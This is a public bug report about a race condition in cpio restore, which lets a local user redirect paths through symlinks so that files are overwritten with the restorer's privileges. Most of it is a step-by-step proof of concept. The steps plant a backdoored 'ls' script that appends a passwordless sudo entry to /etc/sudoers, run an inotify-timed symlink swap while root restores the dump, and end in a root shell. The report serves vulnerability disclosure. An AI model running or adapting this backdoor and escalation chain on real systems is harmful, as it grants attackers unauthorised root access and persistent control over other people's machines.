Bug #577179: Timerace during restore of cpio dump allows overwrite of files with permissions of user running cpio

URL: https://bugs.launchpad.net/ubuntu/+source/cpio/+bug/577179

Metadata: security_related=true; information_type=Public Security; targets=cpio (Ubuntu) (Won't Fix, Low)

Description:
Cpio does not check for modifications of path (symlinks) while restoring a dump. A local user might modify the path while cpio is running, causing cpio to overwrite arbitrary files with permissions of the user running cpio. This might be especially interesting, when an unprivileged user can trigger a backup restore from a cpio dump, either via social engineering or a "restore my site" button, seen at some hosting providers. If the dump is restored using cpio running with root privileges, this will lead to privilege escalation.

Here is an example how to replace "ls" with a backdoored variant during a backup/restore cycle of /home/test. The user to run a command is given in front of every command. Use two parallel shells, since the user has to be logged in during restore.

Create user "test" (our bad user):

root# useradd test --gid users
root# mkdir /home/test
root# chown test.users /home/test

Login as user "test", extract poc

Compile the helper:

test# gcc -o DirModifyInotify DirModifyInotify.c

Prepare the user directory for the nightly backup job (all run as user test)

cd /home/test
mkdir -p root/adir
dd if=/dev/zero bs=1M count=1 of=root/adir/afile
mkdir root/bin
cat <<EOF > root/bin/ls
#!/bin/bash
test -r /etc/shadow && echo "test ALL=NOPASSWD: ALL" >> /etc/sudoers
exec /bin/ls2 "\$@"
EOF
chmod 0755 root/bin/ls
cp -a /bin/ls root/bin/ls2

Run nightly backup as root, this will run 100% as expected, producing a standard user home dir backup

root# find /home/test/ | cpio -o > dump

Run trap commands as user test in /home/test:

test# rm -rf root/bin
test# echo "Waiting for event .." >&2
test# ./DirModifyInotify "root/" "root" "/"

Restore backup as root while trap is running:

root# cpio -i -d < dump

Run "ls" as root, giving full root permissions to user "test" since backdoored ls will add password-less sudo for user test

root# ls

Perform sudo -s /bin/bash to get root

test# sudo -s /bin/bash

Done
